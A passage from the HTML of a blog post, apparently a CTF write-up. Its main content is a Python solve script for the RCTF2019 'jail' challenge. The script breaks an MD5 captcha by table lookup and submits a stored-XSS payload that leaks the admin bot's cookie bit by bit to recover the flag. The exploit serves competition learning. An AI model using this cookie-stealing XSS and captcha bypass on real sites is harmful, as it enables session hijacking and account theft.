class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(s, cipher)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> cipher == <span class="string">'sha1'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha1(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha224'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha224(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha256'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha256(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha384'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.sha384(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'sha512'</span>:</span><br><span class="line">       <span class="keyword">return</span> hashlib.sha512(s).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> cipher == <span class="string">'md5'</span>:</span><br><span class="line">        <span class="keyword">return</span> hashlib.md5(s).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">'cipher not found %s'</span> % cipher)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">hashes = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  return the breaking value </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">break_hash</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> hashes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hashes <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        exists = os.path.isfile(<span class="string">'hashes.marshal'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> exists:</span><br><span class="line">            hashes = &#123;&#125;</span><br><span class="line">            <span class="comment">#  generate a hash dictionary</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">10000000</span>):<span class="comment">#256**4):</span></span><br><span class="line">                s = str(i)</span><br><span class="line">                h = hash(s, cipher)</span><br><span class="line">                hashes[ h[<span class="number">0</span>:<span class="number">6</span>] ] = s</span><br><span class="line"></span><br><span class="line">                <span class="comment">#  0x0FFFFFFF</span></span><br><span class="line">                <span class="comment">#  print every 1048575 times</span></span><br><span class="line">                <span class="keyword">if</span> (i &amp; <span class="number">1048575</span>) == <span class="number">1048575</span>:</span><br><span class="line">                    print(<span class="string">'[*] hash loading at %s'</span> % s)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#  write it into file</span></span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'hashes.marshal'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                marshal.dump(hashes, f)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[*] loading lots of hashes'</span>)</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'hashes.marshal'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                hashes = marshal.load(f)</span><br><span class="line">            print(<span class="string">'[*] done loading'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> hashes:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">'matching hash not found'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashes[key]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">req = <span class="literal">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span><span class="params">(i=<span class="number">0</span>, j=<span class="number">0</span>, tries=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> req</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="number">1</span> &lt;= j &lt; <span class="number">8</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt;= i</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt;= tries &lt;= <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    cookies = &#123;<span class="string">"PHPSESSID"</span>: <span class="string">"a44a15e070b2d3c4adf9e951de241af3"</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> req <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># os.environ["HTTP_PROXY"] = "http://localhost:8080"</span></span><br><span class="line">        <span class="comment"># os.environ["HTTPS_PROXY"] = "http://localhost:8080"</span></span><br><span class="line"></span><br><span class="line">        req = requests.Session()</span><br><span class="line">        req.cookies.update(cookies)</span><br><span class="line">        req.verify = <span class="literal">False</span></span><br><span class="line">        req.allow_redirects = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    word = <span class="string">'retrying'</span> <span class="keyword">if</span> tries &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">'trying'</span></span><br><span class="line">    print(<span class="string">'[*] %s for i=%d j=%d'</span> % (word, i, j))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  what is 0x%08x ?</span></span><br><span class="line">    payload = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">i=0x%08x;</span></span><br><span class="line"><span class="string">j=0x%02x;</span></span><br><span class="line"><span class="string">v = document.cookie;</span></span><br><span class="line"><span class="string">s = v.charCodeAt(i).toString(2).padStart(8, '0')[j];</span></span><br><span class="line"><span class="string">document.cookie="PHPSESSID=%s";</span></span><br><span class="line"><span class="string">window.onload = function() &#123;</span></span><br><span class="line"><span class="string">method = null;</span></span><br><span class="line"><span class="string">if (s === '1') &#123;</span></span><br><span class="line"><span class="string">    method = 'delete';</span></span><br><span class="line"><span class="string">&#125; else if(s === '0') &#123;</span></span><br><span class="line"><span class="string">    method = 'logout';</span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">    method = 'bad';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">document.write('&lt;img src="https://jail.2019.rctf.rois.io/?action=index&amp;method=' + method + '"&gt;');</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">"""</span> % (i, j, cookies[<span class="string">'PHPSESSID'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># submit post with payload</span></span><br><span class="line">    url = <span class="string">'https://jail.2019.rctf.rois.io/'</span></span><br><span class="line">    resp = req.post(url, data=&#123;<span class="string">"message"</span>: payload&#125;,  allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># login if not logged</span></span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">302</span>:</span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/?action=login'</span></span><br><span class="line">        data = &#123;<span class="string">"username"</span>: <span class="string">"leethacker"</span>, <span class="string">"password"</span>: <span class="string">"leethacker"</span>&#125;</span><br><span class="line">        resp = req.post(url, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># resend payload</span></span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/'</span></span><br><span class="line">        resp = req.post(url, data=&#123;<span class="string">"message"</span>: payload&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get post id</span></span><br><span class="line">    post_id = resp.text.split(<span class="string">'/?action=post&amp;id='</span>)[<span class="number">1</span>].split(<span class="string">'" target="'</span>)[<span class="number">0</span>].encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    print(<span class="string">"[*] post_id: %s"</span> % post_id)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># go to feedback page</span></span><br><span class="line">    url = <span class="string">'https://jail.2019.rctf.rois.io/?action=feedback'</span></span><br><span class="line">    resp = req.get(url)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get proof of work</span></span><br><span class="line">    pow = resp.text.split(<span class="string">'Captcha: substr(md5(captcha), 0, 6) == "'</span>)[<span class="number">1</span>].split(<span class="string">'"&lt;/label&gt;'</span>)[<span class="number">0</span>].encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    print(<span class="string">"[*] captcha: %s"</span> % pow)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># submit post id</span></span><br><span class="line">        <span class="comment"># id=0&amp;captcha=1780076&amp;test=1</span></span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/?action=feedback'</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>: post_id,</span><br><span class="line">            <span class="string">'captcha'</span>: break_hash(<span class="string">'md5'</span>, pow),</span><br><span class="line">            <span class="string">'test'</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = req.post(url, data=data)</span><br><span class="line">        print(<span class="string">'[*] sent post to feedback'</span>)</span><br><span class="line">        <span class="keyword">if</span> resp.text.find(<span class="string">'Admin will view your post soon.'</span>) == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># check if all posts were removed or not after 5 seconds</span></span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        url = <span class="string">'https://jail.2019.rctf.rois.io/'</span></span><br><span class="line">        resp = req.get(url, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># resp.text.find('Log-in to your account') != -1:</span></span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">302</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> resp.text.find(post_id) == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># save result and continue to next bit</span></span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> attack(i, j, tries+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_to_str</span><span class="params">(s)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s)<span class="number">-7</span>, <span class="number">8</span>):</span><br><span class="line">        v = <span class="string">'0b'</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">            v += s[i+j]</span><br><span class="line"></span><br><span class="line">        ret += chr(int(v, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    cipher = <span class="string">'md5'</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        key = sys.argv[<span class="number">1</span>]</span><br><span class="line">        x = break_hash(cipher, key)</span><br><span class="line">        print(x)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="string">''</span></span><br><span class="line">        istart = len(s) // <span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(istart, <span class="number">400</span>):</span><br><span class="line">            jstart = len(s) % <span class="number">8</span></span><br><span class="line">            <span class="keyword">if</span> jstart == <span class="number">0</span>:</span><br><span class="line">                s += <span class="string">'0'</span></span><br><span class="line">                jstart += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(jstart, <span class="number">8</span>):</span><br><span class="line">                s += str(attack(i, j))</span><br><span class="line">                print(<span class="string">'[*] s = %s'</span> % s)</span><br><span class="line"></span><br><span class="line">            print(<span class="string">'[*]'</span>)</span><br><span class="line">            print(<span class="string">'[*] flag is %s'</span> % repr(bin_to_str(s)))</span><br><span class="line">            print(<span class="string">'[*]'</span>)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">'[*] s = %s'</span> % s)</span><br><span class="line">        print(<span class="string">'[*] flag is %s'</span> % repr(bin_to_str(s)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/22/SQL题型记录/" rel="next" title="SQL 题型记录">
+                <i class="fa fa-chevron-left"></i> SQL 题型记录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/22/ch4ser‘s vim/" rel="prev" title="ch4ser 的 vim">
+                ch4ser 的 vim <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/dogdog.jpg" alt="ch4ser">
+            
+              <p class="site-author-name" itemprop="name">ch4ser</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ch4ser-go" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/ch4_ser" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                参考链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://skysec.top/" title="一叶飘零" target="_blank">一叶飘零</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.leavesongs.com/" title="p神" target="_blank">p神</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.k0rz3n.com/" title="k0rz3n" target="_blank">k0rz3n</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lorexxar.cn/" title="lorexxar" target="_blank">lorexxar</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.smi1e.top/" title="smi1e" target="_blank">smi1e</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://yulige.top/" title="郁离歌" target="_blank">郁离歌</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.xmsec.cc/tag/ctf/" title="xmsec" target="_blank">xmsec</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://err0rzz.github.io/" title="Err0rzz" target="_blank">Err0rzz</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://altman.vip/" title="altman" target="_blank">altman</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://pplsec.github.io" title="pplsec" target="_blank">pplsec</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://yml-sec.top/" title="YeMoLi" target="_blank">YeMoLi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xi4or0uji.github.io/" title="Xi4or0uji" target="_blank">Xi4or0uji</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hellohxk.com/" title="empty_xl" target="_blank">empty_xl</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zyzilxy.top:1220/#" title="Innofit" target="_blank">Innofit</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://althims.com" title="Moyu" target="_blank">Moyu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.xiafeng2333.top" title="xiafeng" target="_blank">xiafeng</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.rai4over.cn/#" title="rai4over" target="_blank">rai4over</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://handsomedog.top" title="Handsomedog" target="_blank">Handsomedog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web50"><span class="nav-number">1.</span> <span class="nav-text">web50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eXquisite-Scenery-Sites-boot2root"><span class="nav-number">2.</span> <span class="nav-text">eXquisite Scenery Sites(boot2root)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Rctf-rblog"><span class="nav-number">3.</span> <span class="nav-text">Rctf rblog</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCTF2019-jails-amp-password"><span class="nav-number">4.</span> <span class="nav-text">RCTF2019 jails &amp;password</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ch4ser</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量: <span id="busuanzi_value_site_pv"></span>次
+    </span>
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
